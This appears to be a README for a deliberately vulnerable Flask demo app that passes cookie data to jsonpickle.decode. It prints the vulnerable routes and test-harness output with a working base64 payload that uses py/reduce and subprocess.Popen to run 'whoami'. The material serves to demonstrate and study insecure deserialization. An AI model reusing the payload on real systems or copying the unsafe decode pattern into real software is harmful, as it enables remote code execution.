# flask-json-pickle
This is a vulnerable Flask web application that calls ```loads()``` from **jsonpickle** on untrusted data through HTTP cookies.  This vulnerability allows an attacker to create a malicious pickle, encode it with **jsonpickle**, and send it to the web application to exploit the vulnerability.

```
@app.route('/')
def index():
    if request.cookies.get("username"):
        u = jsonpickle.decode(base64.b64decode(request.cookies.get("username")))
        return render_template("index.html", username=u.username)
    else:
        w = redirect("/whoami")
        response = current_app.make_response(w)
        u = User("Guest")
        encoded = base64.b64encode(jsonpickle.encode(u))
        response.set_cookie("username", value=encoded)
        return response


@app.route('/whoami')
def whoami():
    user = jsonpickle.decode(base64.b64decode(request.cookies.get("username")))
    username = user.username
    return render_template("whoami.html", username=username)
```

Also included within this repo, is a test harness for **jsonpickle**.  The code demonstrates the ability to create a malicious pickle and encode it with **jsonpickle**.  It also includes a callback function which can trace every 'call' within the program.  This is used to inspect whether or not **jsonpickle** calls ```loads()``` on the pickled object after it is decoded.

```
*] Test: {"py/object": "__main__.User", "user": "rotlogix"}
[*] Base64 Encoded: eyJweS9vYmplY3QiOiAiX19tYWluX18uU2hlbGwiLCAicHkvcmVkdWNlIjogW3sicHkvdHlwZSI6ICJzdWJwcm9jZXNzLlBvcGVuIn0sIHsicHkvdHVwbGUiOiBbIndob2FtaSJdfSwgbnVsbCwgbnVsbCwgbnVsbF19
[*] JSON encoded Pickle: {"py/object": "__main__.Shell", "py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": ["whoami"]}, null, null, null]}
[*] Reconstructing object from JSON Pickle ...
[*] Shellcode:
 ccopy_reg
_reconstructor
p0
(csubprocess
Popen
p1
c__builtin__
object
p2
Ntp3
Rp4
(dp5
S'_child_created'
p6
I01
sS'returncode'
p7
NsS'stdout'
p8
NsS'stdin'
p9
NsS'pid'
p10
I68312
sS'stderr'
p11
NsS'universal_newlines'
p12
I00
sb.
[*] Result ...
rotlogix
```
